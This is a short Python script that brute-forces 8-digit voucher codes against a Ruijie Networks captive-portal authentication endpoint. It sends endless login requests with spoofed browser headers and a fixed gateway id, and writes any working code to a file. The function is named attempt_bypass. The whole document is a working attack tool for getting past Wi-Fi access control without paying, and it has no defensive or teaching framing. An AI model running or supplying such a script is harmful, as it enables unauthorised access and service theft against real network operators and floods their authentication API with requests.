import requests
import random
import string

PORTAL_URL = "https://portal-as.ruijienetworks.com/api/auth/voucher"

def generate_voucher():
    return ''.join(random.choices(string.digits, k=8))

def attempt_bypass():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://portal-as.ruijienetworks.com',
        'Referer': 'https://portal-as.ruijienetworks.com/auth/login'
    }

    while True:
        voucher = generate_voucher()
        payload = {
            'voucher': voucher,
            'method': 'login',
            'gw_id': '58b4bbcbdf0d'
        }

        try:
            response = requests.post(PORTAL_URL, data=payload, headers=headers)
            res_data = response.json()
            
            if res_data.get("code") == 200 or "success" in str(res_data):
                print(f"SUCCESS: {voucher}")
                with open("found.txt", "a") as f:
                    f.write(f"{voucher}\n")
                break
            else:
                print(f"FAILED: {voucher}")
        except Exception:
            pass

if __name__ == "__main__":
    attempt_bypass()
